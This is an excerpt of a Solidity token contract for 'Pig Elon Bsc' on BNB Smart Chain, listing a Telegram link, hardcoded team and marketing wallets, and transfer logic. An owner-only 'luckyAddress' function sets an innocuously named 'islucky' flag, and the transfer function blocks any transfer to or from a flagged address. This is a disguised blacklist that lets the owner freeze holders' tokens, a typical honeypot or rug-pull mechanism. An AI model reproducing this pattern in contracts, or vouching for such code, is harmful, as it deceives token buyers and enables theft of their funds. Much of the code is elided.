...
/**
Telegram : https://t.me/PIG_ELONBSC
Website : Comingsoon
*/
...
contract PIGELON is Context, IERC20, Ownable {
    ...
    string private _name = "Pig Elon Bsc";
    string private _symbol = "PIGELONBSC";
    uint8 private _decimals = 1;

    address payable public marketingWalletAddress = payable(0x826F36955f4D917a13959C9A402ED3B05585CEf2); 
    address payable public teamWalletAddress = payable(0x15c95923CbF6a0b31741412D1BD85611418869C2); 
    ...
    mapping (address => bool) public islucky;
    ...
    uint256 public _walletMax =  1000 * 10**12 * 10**9; 
    ...
    function luckyAddress(address account, bool newValue) public onlyOwner {
        islucky[account] = newValue;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!islucky[sender] && !islucky[recipient], "To/from address is lucky!");
